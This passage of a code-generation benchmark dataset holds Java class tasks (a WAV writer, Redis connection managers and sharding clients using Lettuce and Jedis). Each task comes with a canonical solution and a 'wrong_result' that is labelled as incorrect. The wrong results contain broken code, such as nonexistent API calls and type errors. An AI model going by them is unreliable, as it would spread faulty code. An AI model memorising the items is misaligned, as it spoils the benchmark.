getUnsignedIntegerBuffer(mFileChannel.size() - 8);\n        mFileChannel.write(buffer, 4);\n    }\n\n    private void updateDataChunkSize() throws IOException\n    {\n        ByteBuffer size = getUnsignedIntegerBuffer(mDataChunkSize);\n        mFileChannel.write(size, mDataChunkSizeOffset);\n    }\n\n    protected static ByteBuffer getUnsignedIntegerBuffer(long size)\n    {\n        ByteBuffer buffer = ByteBuffer.allocate(4);\n        buffer.put((byte)(size & 0xFFl));\n        buffer.put((byte)(Long.rotateRight(size & 0xFF00l, 8)));\n        buffer.put((byte)(Long.rotateRight(size & 0xFF0000l, 16)));\n        buffer.put((byte)Long.rotateRight(Long.rotateRight(size & 0xFF000000l, 16), 8));\n        buffer.position(0);\n        return buffer;\n    }\n\n    private void updateFileName()\n    {\n        String filename = mFile.toString();\n        if(mFileRolloverCounter == 2)\n        {\n            filename = filename.replace(\".tmp\", \"_2.tmp\");\n        }\n        else\n        {\n            Matcher m = FILENAME_PATTERN.matcher(filename);\n            if(m.find())\n            {\n                StringBuilder sb = new StringBuilder();\n                sb.append(m.group(1));\n                sb.append(mFileRolloverCounter);\n                sb.append(m.group(3));\n                filename = sb.toString();\n            }\n        }\n        mFile = Paths.get(filename);\n    }\n\n    public static ByteBuffer getDataHeader()\n    {\n        ByteBuffer header = ByteBuffer.allocate(8);\n        header.put(DATA_CHUNK_ID.getBytes());\n        header.position(0);\n        return header;\n    }\n\n    public static ByteBuffer getWaveHeader(AudioFormat format)\n    {\n        ByteBuffer header = ByteBuffer.allocate(12).order(ByteOrder.LITTLE_ENDIAN);\n        header.put(RIFF_ID.getBytes());\n        header.putInt(INITIAL_TOTAL_LENGTH);\n        header.put(WAVE_ID.getBytes());\n        header.position(0);\n        return header;\n    }\n\n    public static ByteBuffer getFormatChunk(AudioFormat format)\n    {\n        ByteBuffer header = ByteBuffer.allocate(24).order(ByteOrder.LITTLE_ENDIAN);\n        header.put(FORMAT_CHUNK_ID.getBytes());\n        header.putInt(FORMAT_CHUNK_LENGTH);\n        header.putShort(FORMAT_UNCOMPRESSED_PCM);\n        header.putShort((short)format.getChannels());\n        header.putInt((int)format.getSampleRate());\n        int frameByteRate = format.getChannels() * format.getSampleSizeInBits() / 8;\n        int byteRate = (int)(format.getSampleRate() * frameByteRate);\n        header.putInt(byteRate);\n        header.putShort((short)frameByteRate);\n        header.putShort((short)format.getSampleSizeInBits());\n        header.position(0);\n        return header;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "public class WaveWriter implements AutoCloseable {\n    private final AudioFormat mAudioFormat;\n    private int mFileRolloverCounter;\n    private long mMaxSize;\n    private Path mFile;\n    private FileChannel mFileChannel;\n    private boolean mDataChunkOpen;\n    private long mDataChunkSizeOffset;\n    private int mDataChunkSize;\n\n    public WaveWriter(AudioFormat format, Path file, long maxSize) {\n        mAudioFormat = format;\n        mFile = file;\n        mMaxSize = maxSize;\n        mFileRolloverCounter = 0;\n    }\n\n    public WaveWriter(AudioFormat format, Path file) {\n        this(format, file, 0);\n    }\n\n    private void open() throws IOException {\n        if (!Files.exists(mFile)) {\n            Files.createFile(mFile);\n        }\n        mFileChannel = FileChannel.open(mFile, StandardOpenOption.WRITE, StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING);\n        writeWaveHeader();\n    }\n\n    public void close() throws IOException {\n        if (mFileChannel != null) {\n            mFileChannel.close();\n        }\n    }\n\n    public void close(Path path) throws IOException {\n        close();\n        if (path != null && !mFile.equals(path)) {\n            Files.move(mFile, path, StandardCopyOption.REPLACE_EXISTING);\n        }\n    }\n\n    public void writeData(ByteBuffer buffer) throws IOException {\n        mFileChannel.write(buffer);\n        mDataChunkSize += buffer.remaining();\n        if (mMaxSize > 0 && mFileChannel.size() > mMaxSize) {\n            rollover();\n        }\n    }\n\n    private void closeDataChunk() throws IOException {\n        if (mDataChunkOpen) {\n            updateDataChunkSize();\n            mDataChunkOpen = false;\n        }\n    }\n\n    private void openDataChunk() throws IOException {\n        if (!mDataChunkOpen) {\n            ByteBuffer dataChunkId = ByteBuffer.wrap(\"data\".getBytes());\n            dataChunkId.flip();\n            mFileChannel.write(dataChunkId);\n            ByteBuffer sizeBuffer = getUnsignedIntegerBuffer(0);\n            mFileChannel.write(sizeBuffer);\n            mDataChunkSizeOffset = mFileChannel.position() + 4;\n            mDataChunkOpen = true;\n        }\n    }\n\n    private void rollover() throws IOException {\n        closeDataChunk();\n        close();\n        updateFileName();\n        mFile = mFile.toAbsolutePath().getParent() + \"/\" + mFile.getFileName() + \"_\" + mFileRolloverCounter++;\n        mFile = Paths.get(mFile.toString());\n        open();\n    }\n\n    private void updateDataChunkSize() throws IOException {\n        mFileChannel.position(mDataChunkSizeOffset);\n        mFileChannel.write(getUnsignedIntegerBuffer(mDataChunkSize));\n    }\n\n    protected static ByteBuffer getUnsignedIntegerBuffer(long size) {\n        ByteBuffer buffer = ByteBuffer.allocate(4);\n        buffer.putInt((int) size);\n        buffer.flip();\n        return buffer;\n    }\n\n    public static ByteBuffer getDataHeader() {\n        ByteBuffer header = ByteBuffer.allocate(4);\n        header.put((byte) 'd');\n        header.put((byte) 'a');\n        header.put((byte) 't');\n        header.put((byte) 'a');\n        header.flip();\n        return header;\n    }\n\n    public static ByteBuffer getWaveHeader(AudioFormat format) {\n        ByteBuffer header = getFormatChunk(format);\n        header = getWaveHeaderInternal(format);\n        return header;\n    }\n\n    private static ByteBuffer getWaveHeaderInternal(AudioFormat format) {\n        ByteBuffer header = ByteBuffer.allocate(8);\n        header.put((byte) 'R');\n        header.put((byte) 'I');\n        header.put((byte) 'F');\n        header.put((byte) 'F');\n        header.putInt((int) (getFormatChunk(format).limit() + 8));\n        header.flip();\n        return header;\n    }\n\n    public static ByteBuffer getFormatChunk(AudioFormat format) {\n        ByteBuffer buffer = ByteBuffer.allocate(16);\n        buffer.put((byte) 'f');\n        buffer.put((byte) 'm');\n        buffer.put((byte) 't');\n        buffer.put((byte) ' ');\n        buffer.putInt(16);\n        buffer.putShort((short) 1);\n        buffer.putShort((short) 1);\n        buffer.putInt((int) format.getSampleRate());\n        buffer.putInt((int) format.getSampleRate() * format.getFrameSize());\n        buffer.putInt((int) format.getFrameSize());\n        buffer.putShort((short) format.getSampleSizeInBits());\n        buffer.flip();\n        return buffer;\n    }\n\n    private void writeWaveHeader() throws IOException {\n        mFileChannel.write(getWaveHeader(mAudioFormat));\n        mFileChannel.write(getFormatChunk(mAudioFormat));\n        mFileChannel.write(getDataHeader());\n        openDataChunk();\n    }\n\n    private void updateFileName() {\n        mFileRolloverCounter++;\n        mFile = mFile.toAbsolutePath().getParent() + \"/\" + mFile.getFileName() + \"_\" + mFileRolloverCounter;\n    }\n}"
  },
  {
    "Task_id": 340,
    "Instruction": "Task Description: Create a Java class that establishes and manages a connection to a Redis master-slave setup using Lettuce client, with support for read preference configuration.\n\nClass Description: The RedisMasterSlaveConnector class provides functionality to connect to a Redis master-slave deployment, configure read preferences, and properly close connections. It uses Lettuce's MasterReplica API for high availability.\n\nAttributes:\n- redisClient: RedisClient - The underlying Redis client instance\n- connection: StatefulRedisMasterReplicaConnection<String, String> - The active connection to Redis master-slave setup\n\nMethods:\n- connectToMasterSlave(String sentinelUrl) -> void - Establishes a connection to Redis master-slave setup using the provided sentinel URL and configures read preference to prefer master\n- getConnection() -> StatefulRedisMasterReplicaConnection<String, String> - Returns the active Redis master-slave connection\n- closeConnection() -> void - Properly closes the Redis connection and shuts down the client",
    "Canonical_solution": "import io.lettuce.core.ReadFrom;\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.codec.StringCodec;\nimport io.lettuce.core.masterreplica.MasterReplica;\nimport io.lettuce.core.masterreplica.StatefulRedisMasterReplicaConnection;\n\npublic class RedisMasterSlaveConnector {\n\n    private RedisClient redisClient;\n    private StatefulRedisMasterReplicaConnection<String, String> connection;\n\n    public void connectToMasterSlave(String sentinelUrl) {\n        redisClient = RedisClient.create();\n        connection = MasterReplica.connect(redisClient, StringCodec.UTF8, RedisURI.create(sentinelUrl));\n        connection.setReadFrom(ReadFrom.UPSTREAM_PREFERRED);\n    }\n\n    public StatefulRedisMasterReplicaConnection<String, String> getConnection() {\n        return connection;\n    }\n\n    public void closeConnection() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class RedisMasterSlaveConnector {\n    private RedisClient redisClient;\n    private StatefulRedisMasterReplicaConnection<String, String> connection;\n\n    public void connectToMasterSlave(String sentinelUrl) {\n        redisClient = RedisClient.create(sentinelUrl);\n        connection = redisClient.connectMasterReplica();\n        connection.setReadPreference(ReadPreference.MASTER);\n    }\n\n    public StatefulRedisMasterReplicaConnection<String, String> getConnection() {\n        return connection;\n    }\n\n    public void closeConnection() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    }\n}"
  },
  {
    "Task_id": 341,
    "Instruction": "Task Description: Create a Java class that implements Redis client functionality using Jedis for basic key-value operations, hash operations, and key expiration management.\n\nClass Description: JedisClientSingle is a Redis client wrapper class that provides simplified access to common Redis operations using connection pooling. It handles connection management, authentication, and resource cleanup automatically.\n\nAttributes:\n- jedisPool: JedisPool - The connection pool for Redis connections\n- password: String - The password for Redis authentication (optional)\n- port: int - The port number of the Redis server\n- host: String - The host address of the Redis server\n- logger: Logger - SLF4J logger instance for logging operations\n\nMethods:\n- getResource() -> Jedis - Internal method to get a Jedis instance from the pool and authenticate if needed\n- get(String key) -> String - Retrieves the value associated with the given key\n- set(String key, String value) -> String - Sets the value for the given key\n- hget(String hkey, String key) -> String - Gets the value of a field in a hash\n- hset(String hkey, String key, String value) -> long - Sets the value of a field in a hash\n- incr(String key) -> long - Increments the integer value of a key by 1\n- expire(String key, Integer second) -> long - Sets a timeout on a key\n- ttl(String key) -> long - Gets the remaining time to live of a key\n- del(String key) -> long - Deletes a key\n- hdel(String hkey, String key) -> long - Deletes a field from a hash",
    "Canonical_solution": "import org.apache.commons.lang3.StringUtils;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\n\npublic class JedisClientSingle {\n\n    private static final Logger logger = LoggerFactory.getLogger(JedisClientSingle.class);\n\n    private JedisPool jedisPool;\n    private String password;\n    private int port;\n    private String host;\n\n    private Jedis getResource() {\n        if(jedisPool==null) {\n            jedisPool = new JedisPool(host, port);\n        }\n        Jedis resource = jedisPool.getResource();\n        if (StringUtils.isBlank(password)) {\n            return resource;\n        } else {\n            resource.auth(password);\n            return resource;\n        }\n    }\n\n    public String get(String key) {\n        Jedis resource = getResource();\n        String string = resource.get(key);\n        resource.close();\n        return string;\n    }\n\n    public String set(String key, String value) {\n        Jedis resource = getResource();\n        String string = resource.set(key, value);\n        resource.close();\n        return string;\n    }\n\n    public String hget(String hkey, String key) {\n        Jedis resource = getResource();\n        String string = resource.hget(hkey, key);\n        resource.close();\n        return string;\n    }\n\n    public long hset(String hkey, String key, String value) {\n        Jedis resource = getResource();\n        Long hset = resource.hset(hkey, key, value);\n        resource.close();\n        return hset;\n    }\n\n    public long incr(String key) {\n        Jedis resource = getResource();\n        Long incr = resource.incr(key);\n        resource.close();\n        return incr;\n    }\n\n    public long expire(String key, Integer second) {\n        Jedis resource = getResource();\n        Long expire = resource.expire(key, second);\n        resource.close();\n        return expire;\n    }\n\n    public long ttl(String key) {\n        Jedis resource = getResource();\n        Long ttl = resource.ttl(key);\n        resource.close();\n        return ttl;\n    }\n\n    public long del(String key) {\n        Jedis resource = getResource();\n        Long del = resource.del(key);\n        resource.close();\n        return del;\n    }\n\n    public long hdel(String hkey, String key) {\n        Jedis resource = getResource();\n        Long hdel = resource.hdel(hkey, key);\n        resource.close();\n        return hdel;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class JedisClientSingle {\n    private JedisPool jedisPool;\n    private String password;\n    private int port;\n    private String host;\n    private Logger logger;\n\n    public JedisClientSingle(String host, int port, String password) {\n        this.host = host;\n        this.port = port;\n        this.password = password;\n        this.logger = LoggerFactory.getLogger(JedisClientSingle.class);\n        JedisPoolConfig poolConfig = new JedisPoolConfig();\n        jedisPool = new JedisPool(poolConfig, host, port, 2000);\n    }\n\n    private Jedis getResource() {\n        Jedis jedis = jedisPool.getResource();\n        if (password != null) {\n            try {\n                jedis.auth(password);\n            } catch (RedisException e) {\n                logger.error(\"Authentication failed for Redis server\", e);\n                throw e;\n            }\n        }\n        return jedis;\n    }\n\n    public String get(String key) {\n        try (Jedis jedis = getResource()) {\n            return jedis.get(key);\n        }\n    }\n\n    public String set(String key, String value) {\n        try (Jedis jedis = getResource()) {\n            return jedis.set(key, value);\n        }\n    }\n\n    public String hget(String hkey, String key) {\n        try (Jedis jedis = getResource()) {\n            return jedis.hget(hkey, key);\n        }\n    }\n\n    public long hset(String hkey, String key, String value) {\n        try (Jedis jedis = getResource()) {\n            return jedis.hset(hkey, key, value);\n        }\n    }\n\n    public long incr(String key) {\n        try (Jedis jedis = getResource()) {\n            return jedis.incr(key);\n        }\n    }\n\n    public long expire(String key, Integer second) {\n        try (Jedis jedis = getResource()) {\n            return jedis.expire(key, second);\n        }\n    }\n\n    public long ttl(String key) {\n        try (Jedis jedis = getResource()) {\n            return jedis.ttl(key);\n        }\n    }\n\n    public long del(String key) {\n        try (Jedis jedis = getResource()) {\n            return jedis.del(key);\n        }\n    }\n\n    public long hdel(String hkey, String key) {\n        try (Jedis jedis = getResource()) {\n            return jedis.hdel(hkey, key);\n        }\n    }\n}"
  },
  {
    "Task_id": 342,
    "Instruction": "Task Description: Create a Redis connection factory class in Java that handles both standalone Redis instances and Redis clusters, with support for connection pooling and sentinel configurations.\n\nClass Description: The RedisConnectionFactory class provides a centralized way to create and manage Redis connections (both standalone and cluster) with configurable connection parameters. It handles connection pooling, authentication, and resource cleanup.\n\nAttributes:\n- hostName: String - The Redis server hostname (default: \"localhost\")\n- port: int - The Redis server port (default: 6379)\n- timeout: int - Connection timeout in milliseconds (default: 2000)\n- password: String - Password for Redis authentication\n- sentinelMaster: String - Name of the Redis sentinel master\n- redisServers: List<RedisNode> - List of Redis server nodes for cluster/sentinel configuration\n- isCluster: boolean - Flag indicating whether to use Redis cluster mode\n- dbIndex: int - Redis database index to select (default: 0)\n- shardInfo: JedisShardInfo - Redis connection shard information\n- pool: Pool<Jedis> - Jedis connection pool instance\n- cluster: JedisCluster - Jedis cluster instance\n- poolConfig: JedisPoolConfig - Configuration for the connection pool\n\nMethods:\n- init(): void - Initializes the Redis connection factory by creating either a connection pool or cluster instance\n- destroy(): void - Cleans up resources by closing all active connections and pools\n- fetchJedisConnector(): Jedis - Internal method to fetch a Jedis connection from pool or create a new one\n- createPool(): Pool<Jedis> - Creates a Redis connection pool (either regular or sentinel)\n- createRedisSentinelPool(): Pool<Jedis> - Creates a Redis sentinel connection pool\n- createRedisPool(): Pool<Jedis> - Creates a regular Redis connection pool\n- createCluster(): JedisCluster - Creates a Redis cluster connection\n- getJedisConnection(): Jedis - Returns a configured Jedis connection\n- getClusterConnection(): JedisCluster - Returns the Jedis cluster instance",
    "Canonical_solution": "import com.mpush.cache.redis.RedisServer;\nimport com.mpush.tools.config.data.RedisNode;\nimport org.apache.commons.lang3.StringUtils;\nimport org.apache.commons.pool2.impl.GenericObjectPoolConfig;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport redis.clients.jedis.*;\nimport redis.clients.util.Pool;\n\nimport java.util.List;\nimport java.util.Objects;\nimport java.util.Set;\nimport java.util.stream.Collectors;\n\npublic class RedisConnectionFactory {\n\n    private final static Logger log = LoggerFactory.getLogger(RedisConnectionFactory.class);\n\n    private String hostName = \"localhost\";\n    private int port = Protocol.DEFAULT_PORT;\n    private int timeout = Protocol.DEFAULT_TIMEOUT;\n    private String password;\n    private String sentinelMaster;\n    private List<RedisNode> redisServers;\n    private boolean isCluster = false;\n    private int dbIndex = 0;\n    private JedisShardInfo shardInfo;\n    private Pool<Jedis> pool;\n    private JedisCluster cluster;\n    private JedisPoolConfig poolConfig = new JedisPoolConfig();\n\n    public RedisConnectionFactory() {\n    }\n\n    protected Jedis fetchJedisConnector() {\n        try {\n            if (pool != null) {\n                return pool.getResource();\n            }\n            Jedis jedis = new Jedis(getShardInfo());\n            jedis.connect();\n            return jedis;\n        } catch (Exception ex) {\n            throw new RuntimeException(\"Cannot get Jedis connection\", ex);\n        }\n    }\n\n    public void init() {\n        if (shardInfo == null) {\n            shardInfo = new JedisShardInfo(hostName, port);\n            if (StringUtils.isNotEmpty(password)) {\n                shardInfo.setPassword(password);\n            }\n            if (timeout > 0) {\n                shardInfo.setConnectionTimeout(timeout);\n            }\n        }\n\n        if (isCluster) {\n            this.cluster = createCluster();\n        } else {\n            this.pool = createPool();\n        }\n    }\n\n    private Pool<Jedis> createPool() {\n        if (StringUtils.isNotBlank(sentinelMaster)) {\n            return createRedisSentinelPool();\n        }\n        return createRedisPool();\n    }\n\n    protected Pool<Jedis> createRedisSentinelPool() {\n        Set<String> hostAndPorts = redisServers\n                .stream()\n                .map(redisNode -> new HostAndPort(redisNode.host, redisNode.port).toString())\n                .collect(Collectors.toSet());\n        return new JedisSentinelPool(sentinelMaster, hostAndPorts, poolConfig, getShardInfo().getSoTimeout(), getShardInfo().getPassword());\n    }\n\n    protected Pool<Jedis> createRedisPool() {\n        return new JedisPool(getPoolConfig(), shardInfo.getHost(), shardInfo.getPort(), shardInfo.getSoTimeout(), shardInfo.getPassword());\n    }\n\n    protected JedisCluster createCluster() {\n        Set<HostAndPort> hostAndPorts = redisServers\n                .stream()\n                .map(redisNode -> new HostAndPort(redisNode.host, redisNode.port))\n                .collect(Collectors.toSet());\n        if (StringUtils.isNotEmpty(getPassword())) {\n            throw new IllegalArgumentException(\"Jedis does not support password protected Redis Cluster configurations!\");\n        }\n        int redirects = 5;\n        return new JedisCluster(hostAndPorts, timeout, redirects, poolConfig);\n    }\n\n    public void destroy() {\n        if (pool != null) {\n            try {\n                pool.destroy();\n            } catch (Exception ex) {\n                log.warn(\"Cannot properly close Jedis pool\", ex);\n            }\n            pool = null;\n        }\n        if (cluster != null) {\n            try {\n                cluster.close();\n            } catch (Exception ex) {\n                log.warn(\"Cannot properly close Jedis cluster\", ex);\n            }\n            cluster = null;\n        }\n    }\n\n    public Jedis getJedisConnection() {\n        Jedis jedis = fetchJedisConnector();\n        if (dbIndex > 0 && jedis != null) {\n            jedis.select(dbIndex);\n        }\n        return jedis;\n    }\n\n    public JedisCluster getClusterConnection() {\n        return cluster;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "import redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\nimport redis.clients.jedis.JedisCluster;\nimport redis.clients.jedis.JedisSentinelPool;\nimport redis.clients.jedis.HostAndPort;\nimport java.util.List;\nimport java.util.ArrayList;\n\npublic class RedisConnectionFactory {\n    private String hostName = \"localhost\";\n    private int port = 6379;\n    private int timeout = 2000;\n    private String password;\n    private String sentinelMaster;\n    private List<RedisNode> redisServers;\n    private boolean isCluster;\n    private int dbIndex = 0;\n    private JedisShardInfo shardInfo;\n    private Pool<Jedis> pool;\n    private JedisCluster cluster;\n    private JedisPoolConfig poolConfig;\n\n    public void init() {\n        if (isCluster) {\n            cluster = createCluster();\n        } else if (sentinelMaster != null) {\n            pool = createRedisSentinelPool();\n        } else {\n            pool = createRedisPool();\n        }\n    }\n\n    public void destroy() {\n        if (pool != null) {\n            pool.close();\n        }\n        if (cluster != null) {\n            cluster.close();\n        }\n    }\n\n    private Jedis fetchJedisConnector() {\n        if (pool != null) {\n            return pool.getResource();\n        } else {\n            return new Jedis(hostName, port);\n        }\n    }\n\n    private Pool<Jedis> createPool() {\n        JedisPoolConfig poolConfig = new JedisPoolConfig();\n        return new JedisPool(poolConfig, hostName, port, timeout, password, dbIndex);\n    }\n\n    private Pool<Jedis> createRedisSentinelPool() {\n        JedisPoolConfig poolConfig = new JedisPoolConfig();\n        List<HostAndPort> sentinelNodes = new ArrayList<>();\n        for (RedisNode node : redisServers) {\n            sentinelNodes.add(new HostAndPort(node.getHost(), node.getPort()));\n        }\n        return new JedisSentinelPool(sentinelMaster, sentinelNodes, poolConfig, timeout, password, dbIndex);\n    }\n\n    private JedisCluster createCluster() {\n        List<HostAndPort> jedisNodes = new ArrayList<>();\n        for (RedisNode node : redisServers) {\n            jedisNodes.add(new HostAndPort(node.getHost(), node.getPort()));\n        }\n        return new JedisCluster(jedisNodes, timeout, password, dbIndex);\n    }\n\n    public Jedis getJedisConnection() {\n        Jedis jedis = fetchJedisConnector();\n        if (jedis == null) {\n            throw new RuntimeException(\"No available Jedis connection\");\n        }\n        return jedis;\n    }\n\n    public JedisCluster getClusterConnection() {\n        if (cluster == null) {\n            throw new RuntimeException(\"Cluster connection not initialized\");\n        }\n        return cluster;\n    }\n}"
  },
  {
    "Task_id": 345,
    "Instruction": "Task Description: Implement a Redis sharding client in Java that distributes keys across multiple Redis instances using consistent hashing, with support for basic CRUD operations and command execution.\n\nClass Description: JedisSharding is a Redis client wrapper that implements sharding across multiple Redis instances. It uses consistent hashing to distribute keys and automatically manages connections to the appropriate shard for each operation.\n\nAttributes:\n- shards: List<HostAndPort> - List of Redis server addresses and ports for sharding\n- clientConfig: JedisClientConfig - Configuration for Redis client connections\n- hashing: Hashing - Hashing algorithm used for key distribution (defaults to MURMUR_HASH)\n\nMethods:\n- JedisSharding(List<HostAndPort>, JedisClientConfig) -> void - Constructor with default hashing algorithm\n- JedisSharding(List<HostAndPort>, JedisClientConfig, Hashing) -> void - Constructor with custom hashing algorithm\n- set(String, String) -> String - Stores a key-value pair in the appropriate shard\n- get(String) -> String - Retrieves a value from the appropriate shard\n- sendCommand(String, Protocol.Command, String...) -> Object - Sends a raw Redis command to the appropriate shard\n- close() -> void - Cleans up resources (no-op as connections are managed per-operation)\n- getShard(String) -> Jedis - Internal method to get a connection to the correct shard\n- getShardIndex(String) -> int - Internal method to calculate shard index for a key",
    "Canonical_solution": "import redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisClientConfig;\nimport redis.clients.jedis.util.Hashing;\nimport java.util.List;\n\npublic class JedisSharding implements AutoCloseable {\n\n    private final List<HostAndPort> shards;\n    private final JedisClientConfig clientConfig;\n    private final Hashing hashing;\n\n    public JedisSharding(List<HostAndPort> shards, JedisClientConfig clientConfig) {\n        this(shards, clientConfig, Hashing.MURMUR_HASH);\n    }\n\n    public JedisSharding(List<HostAndPort> shards, JedisClientConfig clientConfig, Hashing hashing) {\n        this.shards = shards;\n        this.clientConfig = clientConfig;\n        this.hashing = hashing;\n    }\n\n    public String set(String key, String value) {\n        try (Jedis jedis = getShard(key)) {\n            return jedis.set(key, value);\n        }\n    }\n\n    public String get(String key) {\n        try (Jedis jedis = getShard(key)) {\n            return jedis.get(key);\n        }\n    }\n\n    public Object sendCommand(String key, Protocol.Command command, String... args) {\n        try (Jedis jedis = getShard(key)) {\n            return jedis.sendCommand(command, args);\n        }\n    }\n\n    private Jedis getShard(String key) {\n        int shardIndex = getShardIndex(key);\n        HostAndPort shard = shards.get(shardIndex);\n        Jedis jedis = new Jedis(shard, clientConfig);\n        if (shard.getPassword() != null) {\n            jedis.auth(shard.getPassword());\n        }\n        return jedis;\n    }\n\n    private int getShardIndex(String key) {\n        long hash = hashing.hash(key);\n        return (int) (hash % shards.size());\n    }\n\n    @Override\n    public void close() {\n        // Connection cleanup handled by try-with-resources in individual operations\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "import redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisClientConfig;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic interface Hashing {\n    int hash(String key);\n}\n\npublic class MurmurHash implements Hashing {\n    @Override\n    public int hash(String key) {\n        return key.hashCode();\n    }\n}\n\npublic class JedisSharding {\n    private List<HostAndPort> shards;\n    private JedisClientConfig clientConfig;\n    private Hashing hashing;\n    private List<Integer> shardHashes;\n\n    public JedisSharding(List<HostAndPort> shards, JedisClientConfig clientConfig) {\n        this(shards, clientConfig, new MurmurHash());\n    }\n\n    public JedisSharding(List<HostAndPort> shards, JedisClientConfig clientConfig, Hashing hashing) {\n        this.shards = shards;\n        this.clientConfig = clientConfig;\n        this.hashing = hashing;\n        this.shardHashes = new ArrayList<>();\n        for (HostAndPort shard : shards) {\n            shardHashes.add(hashing.hash(shard.getHost() + \":\" + shard.getPort()));\n        }\n    }\n\n    public String set(String key, String value) {\n        int shardIndex = getShardIndex(key);\n        Jedis jedis = getShard(shardIndex);\n        try {\n            return jedis.set(key, value);\n        } finally {\n            jedis.close();\n        }\n    }\n\n    public String get(String key) {\n        int shardIndex = getShardIndex(key);\n        Jedis jedis = getShard(shardIndex);\n        try {\n            return jedis.get(key);\n        } finally {\n            jedis.close();\n        }\n    }\n\n    public Object sendCommand(String commandName, Protocol.Command command, String... args) {\n        int shardIndex = getShardIndex(commandName);\n        Jedis jedis = getShard(shardIndex);\n        try {\n            return jedis.sendCommand(commandName, command, args);\n        } finally {\n            jedis.close();\n        }\n    }\n\n    public void close() {\n        // No-op as connections are managed per-operation\n    }\n\n    private Jedis getShard(int shardIndex) {\n        HostAndPort shard = shards.get(shardIndex);\n        Jedis jedis = new Jedis(shard.getHost(), shard.getPort(), clientConfig.getTimeout());\n        return jedis;\n    }\n\n    private int getShardIndex(String key) {\n        int keyHash = hashing.hash(key);\n        int index = 0;\n        for (int i = 0; i < shardHashes.size(); i++) {\n            if (shardHashes.get(i) > keyHash) {\n                index = i;\n                break;\n            }\n        }\n        if (index == 0) {\n            return 0;\n        }\n        return index;\n    }\n}"
  },
  {
    "Task_id": 347,
    "Instruction": "Task Description: Create a Redis connection manager class in Java using Lettuce client that handles connection setup, operations, and cleanup.\n\nClass Description: RedisConnectionManager is a utility class that manages Redis connections and provides basic Redis operations. It handles connection lifecycle and ensures proper resource cleanup.\n\nAttributes:\n- client: RedisClient - The Redis client instance used for connections\n- redis: RedisCommands<String, String> - Synchronous Redis commands interface for string operations\n\nMethods:\n- setupClient(): void - Static method to initialize the default Redis client with default options\n- newRedisClient(): RedisClient - Static method to create a new Redis client with test resources (host and port should be defined elsewhere)\n- connect(): RedisCommands<String, String> - Establishes and returns a synchronous Redis connection\n- openConnection(): void - Opens a connection, configures client options, and ensures Redis is in a clean state by flushing data and killing any running scripts\n- closeConnection(): void - Closes the active Redis connection and releases resources",
    "Canonical_solution": "import io.lettuce.core.api.sync.RedisCommands;\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.ClientOptions;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.test.resource.DefaultRedisClient;\nimport io.lettuce.test.resource.TestClientResources;\n\npublic class RedisConnectionManager {\n\n    protected static RedisClient client;\n    protected RedisCommands<String, String> redis;\n\n    public static void setupClient() {\n        client = DefaultRedisClient.get();\n        client.setOptions(ClientOptions.create());\n    }\n\n    private static RedisClient newRedisClient() {\n        return RedisClient.create(TestClientResources.get(), RedisURI.Builder.redis(host, port).build());\n    }\n\n    public RedisCommands<String, String> connect() {\n        RedisCommands<String, String> connect = client.connect().sync();\n        return connect;\n    }\n\n    public void openConnection() throws Exception {\n        client.setOptions(ClientOptions.builder().build());\n        redis = connect();\n        boolean scriptRunning;\n        do {\n            scriptRunning = false;\n            try {\n                redis.flushall();\n                redis.flushdb();\n            } catch (RedisBusyException e) {\n                scriptRunning = true;\n                try {\n                    redis.scriptKill();\n                } catch (RedisException e1) {\n                    // Script might have ended between BUSY check and KILL attempt\n                }\n            }\n        } while (scriptRunning);\n    }\n\n    public void closeConnection() throws Exception {\n        if (redis != null) {\n            redis.getStatefulConnection().close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisCommands;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.client.RedisClientOptions;\nimport java.time.Duration;\n\npublic class RedisConnectionManager {\n    private static RedisClient client;\n    private static RedisCommands<String, String> redis;\n\n    public static void setupClient() {\n        RedisClientOptions options = RedisClientOptions.builder()\n                .timeout(Duration.ofSeconds(10))\n                .build();\n        client = RedisClient.create(RedisURI.create(\"redis://localhost:6379\"), options);\n    }\n\n    public static RedisClient newRedisClient() {\n        return RedisClient.create(RedisURI.create(\"redis://localhost:6379\"));\n    }\n\n    public RedisCommands<String, String> connect() {\n        redis = client.connect().sync();\n        return redis;\n    }\n\n    public void openConnection() {\n        client.connect();\n        redis.flushAll();\n    }\n\n    public void closeConnection() {\n        client.close();\n    }\n}"
  },
  {
    "Task_id": 349,
